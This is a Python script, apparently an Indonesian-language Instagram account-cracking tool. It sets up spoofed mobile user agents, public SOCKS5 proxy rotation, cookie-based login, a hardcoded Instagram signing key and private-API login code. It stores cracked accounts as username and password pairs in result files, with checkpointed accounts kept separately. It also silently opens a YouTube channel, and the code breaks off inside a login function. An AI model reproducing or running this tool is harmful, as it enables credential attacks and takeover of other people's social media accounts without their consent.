
#+++++# utf-8 #+++++#
#python ##
try:
	import re
	import os
	import sys
	import bs4
	import time
	import datetime
	import requests
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'module {e} belum terinstall ')
	
#+++++# import rich and ingredient #+++++#
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.table import Table as me
from rich.columns import Columns
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.panel import Panel as nel
from rich import print as cetak
console = Console()

#+++++# import module #+++++#
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser

#+++++# convert & url insta #+++++#
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

#+++++# warna untuk print #+++++#	
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#+++++# warna untuk rich #+++++#	
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
R2 = random.choice([M2,H2,K2,J2,B2,O2,A2,N2])

#+++++# cek warna tema tools #+++++#	
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#FFFFFF"

#+++++# global nama #+++++#
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku = [],[],[],[],0,[],[],['sukses']
method, menudump, xxkontol, userAGENT, BrayennnXD = [], [], [], [], []
s = requests.Session()

#+++++# auto create folder #+++++#
try:os.mkdir("result")
except:pass
try:os.mkdir("data")
except:pass

#+++++# mengambil ip address #+++++#
url = requests.get("http://ip-api.com/json/").json()
try:
	IP  = url["query"]
	CN = url["country"]
	RN = url["regionName"]
	AS = url["as"]
except KeyError:
	IP = "-"
	CN = "-"
	RN = "-"
	AS = "-"

#+++++# setting proxy #+++++#
def setting_proxy():
	prints(Panel(f'{P2}ketik {H2}"T" {P2}jika ingin menggunakan proxy yang sudah tersedia di dalam scirpt',width=80,padding=(0,1),style=f"{color_table}"))
	pr = input(f" {H}# {P}ingin menggunakan proxy baru? Y/t : ")
	if pr in ["y","Y"]:
	   try:
	       prox = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
	       open('data/proxy.txt','w').write(prox)
	   except Exception as e:
	       print(f" {H}# {P}koneksi internet anda bermasalah")
	       time.sleep(3)
	       exit()
	else:pass

#+++++# UserAgent #+++++#
def _UserAgent_():
    rc = random.choice
    USN = str(rc([
          "Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00LD Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 Instagram 169.0.0.26.135 Android (27/8.1.0; 360dpi; 720x1280; asus; ASUS_X00LD; ASUS_X00LD_1; qcom; pt_BR; 262290750)",
          "Mozilla/5.0 (Linux; Android 7.1.1; ASUS_X00LDA Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 35.0.0.20.96 Android (25/7.1.1; 320dpi; 720x1280; asus; ASUS_X00LDA; ASUS_X00LD_3; qcom; pt_PT; 95414345)",
          "Mozilla/5.0 (Linux; Android 9; ZB633KL Build/WW_Phone-201909201544; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.90 Mobile Safari/537.36 Instagram 118.0.0.28.122 Android (28/9; 320dpi; 720x1369; asus; ZB633KL; ASUS_X01A_1; qcom",
          "Mozilla/5.0 (Linux; Android 5.0; Lenovo K50-t5 Build/LRX21M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (21/5.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K50-t5; aio_otfp; mt6752; ru_RU; 99640911)",
          "Mozilla/5.0 (Linux; Android 6.0; Lenovo S1a40 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 Instagram 129.0.0.29.119 Android (23/6.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo S1a40; S1a40;",
          "Mozilla/5.0 (Linux; Android 7.1.1; Aquaris X Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 Instagram 29.0.0.13.95 Android (25/7.1.1; 480dpi; 1080x1920; bq; Aquaris X; bardock; qcom; pt_PT)"
          ]))
    return USN

#+++++# UserAgent Crack #+++++#
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.85 Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android 10; AGS3-W09; HMSCore 6.9.6.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.3.301 Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; arm; Android 7.0; SLA-TL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.6.0.211.00 SA/1 TA/7.1 Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga]))
    userAGENT.append(UserAgentss)
       
#+++++# clear layar #+++++#
def _clearLayar_():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

#+++++# mengambil waktu #+++++#	
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow
		
#+++++# anggap aja logo #+++++#	
def banner():
	os.system("xdg-open https://youtube.com/@vindradesign")
	_clearLayar_()
	prints(Panel(f"""
╦╔═╗   ╔═╗╦═╗╔═╗╔═╗╦╔═   script: BrayennnXD
║║ ╦───║  ╠╦╝╠═╣║  ╠╩╗   gatausiapa: Vindra XD
╩╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩   github: github.com/Dra-ID
""",title=f"{R2}{waktu()}",width=80,padding=(0,6),style=f"{color_table}"))

#+++++# loading #+++++#		
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {H}# {P}wait.. cek status login " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		

#+++++# cek python version #+++++#	    
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

#+++++# cek login #+++++#	 
def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":_UserAgent_(),"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user

#+++++# halaman login #+++++#	
def _loginPILL_():
    if "sukses" in lisensiku:
        try:
            kuki = open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            prints(Panel(f"{P2}[{H2}01{P2}]. login dengan cookie ( {H2}disarankan {P2})\n{P2}[{H2}02{P2}]. login dengan username password\n{P2}[{H2}03{P2}]. lihat akun hasil crack\n{P2}[{H2}00{P2}]. keluar tools",width=80,padding=(0,15),style=f"{color_table}"))
            ask = input(f" {H}# {P}choose : ")
            if ask in [""]:empty()
            elif ask in ["1","01"]:_LoginCookie_()
            elif ask in ["2","02"]:login_username()
            elif ask in ["3","04"]:cekResult()
            elif ask in ["0","00"]:exit()
            else:wrong()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        lisensi()

#+++++# hapus data login #+++++#
def removeDATA():
    try:os.remove(".kukis.log")
    except:pass
    try:os.remove(".username")
    except:pass

#+++++# cek results #+++++#	         
def cekResult():
    for i in os.listdir('result'):
        print(f' {H}# {P}{i}')
    prints(Panel(f"{P2}copy nama file di atas terus pastekan di bawah",width=80,padding=(0,15),style=f"{color_table}"))
    c  = input(f' {H}# {P}masukan nama file :{H} ')
    g  = open("result/%s"%(c)).read().splitlines()
    xx = c.split("-")
    xc = xx[0]
    print(f' {H}# {P}total results yang di temukan {H}{len(g)}{P}')
    time.sleep(3)
    for s in g:
        usr = s.split("|")[0]
        pwd = s.split("|")[1]
        fol = s.split("|")[2]
        ful = s.split("|")[3]
        if xc == "checkpoint":
          tree = Tree("")
          tree.add(Panel.fit(f"{K2}{usr} {P2}| {K2}{pwd}"))
          tree.add(Panel.fit(f"pengikut  : {K2}{fol}"))
          tree.add(Panel.fit(f"mengikuti : {K2}{ful}")).add(Panel.fit(f"{K2}{_UserAgent_()}"))
          prints(tree)
          time.sleep(0.05)
             
        else:
              tree = Tree("")
              tree.add(Panel.fit(f"{H2}{usr} {P2}| {H2}{pwd}"))
              tree.add(Panel.fit(f"pengikut  : {H2}{fol}"))
              tree.add(Panel.fit(f"mengikuti : {H2}{ful}")).add(Panel.fit(f"{H2}{_UserAgent_()}"))
              prints(tree)
              time.sleep(0.05)
			  
					
#+++++# kosong #+++++#	 
def empty():
    try:
        text = "# pilih menu jangan kosong!"
        empty = mark(text, style=f"red")
        sol().print(empty)
        time.sleep(3)
        _loginPILL_()
    except:pass

#+++++# salah #+++++#	 
def wrong():
    try:
        text = "# anda harus memilih menu di atas!"
        wrong = mark(text, style='red')
        sol().print(wrong)
        time.sleep(3)
        _loginPILL_()
    except:pass

#+++++# login cookie #+++++#	 
def _LoginCookie_():
    if "sukses" in lisensiku:
        try:
            kuki = open('.kukis.log','r').read()
        except FileNotFoundError:
          prints(Panel(f"{P2}jangan gunakan akun pribadi anda untuk login ke InstaBrayen",width=80,padding=(0,9),style=f"{color_table}"))
          us = input(f' {H}# {P}masukan username : {H}')
          cok = input(f' {H}# {P}masukan cookie   :{H} ');loading()
          kuki = open('.kukis.log','w').write(cok)
          user = open('.username','w').write(us)
          text = "# login berhasil, jalankan ulang scriptnya"
          wrong = mark(text, style='green')
          sol().print(wrong)
          time.sleep(3)
          os.system("xdg-open https://youtube.com/@vindradesign")
          exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
         lisensi()

#+++++# login username & password #+++++#    
def login_username():
    try:
        text = "# mohon maaf login username dan password sementara admin nonaktifkan"
        wrong = mark(text, style='red')
        sol().print(wrong)
        time.sleep(3)
        _loginPILL_()
    except:pass

#+++++# UserAgent #+++++#    
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

#+++++# UserAgent #+++++#    
def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

#+++++# UserAgent #+++++#    
def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
